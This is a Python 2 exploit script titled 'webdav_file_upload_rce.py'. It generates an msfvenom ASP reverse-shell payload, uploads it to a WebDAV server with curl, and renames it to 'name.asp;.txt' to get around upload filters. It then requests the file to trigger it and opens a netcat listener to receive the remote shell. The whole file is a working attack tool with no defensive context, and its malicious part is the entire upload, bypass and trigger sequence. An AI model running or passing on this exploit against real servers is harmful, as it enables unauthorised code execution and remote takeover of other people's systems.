#!/usr/bin/env python2
#  -*- coding: utf-8 -*- ####################################################################################
#▄▄▌ ▐ ▄▌▄▄▄ .▄▄▄▄· ·▄▄▄▄   ▄▄▄·  ▌ ▐·▄• ▄▌ ▄▄▄·▄▄▌         ▄▄▄· ·▄▄▄▄  ▄▄▄   ▄▄· ▄▄▄ .                     #
#██· █▌▐█▀▄.▀·▐█ ▀█▪██▪ ██ ▐█ ▀█ ▪█·█▌█▪██▌▐█ ▄███•  ▪     ▐█ ▀█ ██▪ ██ ▀▄ █·▐█ ▌▪▀▄.▀·                     #
#██▪▐█▐▐▌▐▀▀▪▄▐█▀▀█▄▐█· ▐█▌▄█▀▀█ ▐█▐█•█▌▐█▌ ██▀·██▪   ▄█▀▄ ▄█▀▀█ ▐█· ▐█▌▐▀▀▄ ██ ▄▄▐▀▀▪▄                     #
#▐█▌██▐█▌▐█▄▄▌██▄▪▐███. ██ ▐█ ▪▐▌ ███ ▐█▄█▌▐█▪·•▐█▌▐▌▐█▌.▐▌▐█ ▪▐▌██. ██ ▐█•█▌▐███▌▐█▄▄▌                     #
# ▀▀▀▀ ▀▪ ▀▀▀ ·▀▀▀▀ ▀▀▀▀▀•  ▀  ▀ . ▀   ▀▀▀ .▀   .▀▀▀  ▀█▄▀▪ ▀  ▀ ▀▀▀▀▀• .▀  ▀·▀▀▀  ▀▀▀                      #
# webdav_file_upload_rce.py - nighter                                                                       #
#                                                                                                           #
# DATE                                                                                                      #
# 25/10/2019                                                                                                #
#                                                                                                           #
# DESCRIPTION                                                                                               # 
# This code upload a payload over webdav and try to use filter evasion to bypass protection and trigger it  #
# I did not want nice code, I just wanted something working quick so we use curl                            #
#                                                                                                           #
# nighter - http://nighter.se/                                                                              #
#                                                                                                           #
#############################################################################################################
__author__ = 'nighter@nighter.se'

import requests
import os
import sys
import time
import random

from multiprocessing import Process

def build_payload():
    print("[+] Building payload")
    command = "msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=%s LPORT=%s -f asp -o /tmp/%s.asp.txt" % (LHOST, LPORT, FILENAME)
    os.system(command)

def exploit():

    print("[+] Upload payload: /tmp/%s.asp.txt" % FILENAME)
    command = 'curl -s --upload-file /tmp/%s.asp.txt %s > /dev/null 2>&1' % (FILENAME, URL)
    os.system(command)
    time.sleep(1)

    print("[+] Renaming for filter bypass: %s.asp;.txt" % FILENAME)
    command = """curl -s -X MOVE --header 'Destination:%s/%s.asp;.txt' '%s/%s.asp.txt' > /dev/null 2>&1""" % (URL, FILENAME, URL, FILENAME)
    os.system(command)

    time.sleep(1)

    print("[+] Trigger payload")
    command = """curl -s '%s/%s.asp;.txt' > /dev/null 2>&1""" % (URL, FILENAME)
    os.system(command)

    os.unlink("/tmp/%s.asp.txt" % FILENAME)


if __name__ == '__main__':

    if len(sys.argv) != 4:
        print ("""
▄▄▌ ▐ ▄▌▄▄▄ .▄▄▄▄· ·▄▄▄▄   ▄▄▄·  ▌ ▐·▄• ▄▌ ▄▄▄·▄▄▌         ▄▄▄· ·▄▄▄▄  ▄▄▄   ▄▄· ▄▄▄ .
██· █▌▐█▀▄.▀·▐█ ▀█▪██▪ ██ ▐█ ▀█ ▪█·█▌█▪██▌▐█ ▄███•  ▪     ▐█ ▀█ ██▪ ██ ▀▄ █·▐█ ▌▪▀▄.▀·
██▪▐█▐▐▌▐▀▀▪▄▐█▀▀█▄▐█· ▐█▌▄█▀▀█ ▐█▐█•█▌▐█▌ ██▀·██▪   ▄█▀▄ ▄█▀▀█ ▐█· ▐█▌▐▀▀▄ ██ ▄▄▐▀▀▪▄
▐█▌██▐█▌▐█▄▄▌██▄▪▐███. ██ ▐█ ▪▐▌ ███ ▐█▄█▌▐█▪·•▐█▌▐▌▐█▌.▐▌▐█ ▪▐▌██. ██ ▐█•█▌▐███▌▐█▄▄▌
 ▀▀▀▀ ▀▪ ▀▀▀ ·▀▀▀▀ ▀▀▀▀▀•  ▀  ▀ . ▀   ▀▀▀ .▀   .▀▀▀  ▀█▄▀▪ ▀  ▀ ▀▀▀▀▀• .▀  ▀·▀▀▀  ▀▀▀ 
[nighter@nighter.se]
""")
        print "Usage: %s <URL> <LHOST> <LPORT>" % (sys.argv[0])
        sys.exit(0)

    URL = sys.argv[1]
    LHOST = sys.argv[2]
    LPORT = sys.argv[3]

    # Generate random number as filename
    FILENAME = str(random.random())[-1]

    print("[+] LHOST = %s" % LHOST)
    print("[+] LPORT = %s" % LPORT)

    build_payload()
    # Run exploit Async
    p = Process(target=exploit)
    p.start()

    print("[+] Netcat port: %s" % LPORT)
    os.system('nc -lnvp %s' % LPORT)





